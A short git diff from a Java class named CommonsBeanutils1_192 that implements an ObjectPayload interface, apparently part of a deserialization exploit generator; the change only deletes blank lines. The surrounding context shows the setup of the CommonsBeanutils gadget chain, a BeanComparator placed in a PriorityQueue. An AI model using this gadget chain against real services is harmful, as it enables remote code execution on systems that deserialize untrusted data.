@@ -20,10 +20,7 @@ public class CommonsBeanutils1_192 implements ObjectPayload {
 
         Object beanComparator = u.getDeclaredConstructor(String.class).newInstance("lowestSetBit");
 
-
-
 //        BeanComparator comparator = new BeanComparator("lowestSetBit");
-
 
         PriorityQueue<Object> queue = new PriorityQueue(2, (Comparator<? super Object>)beanComparator);
 
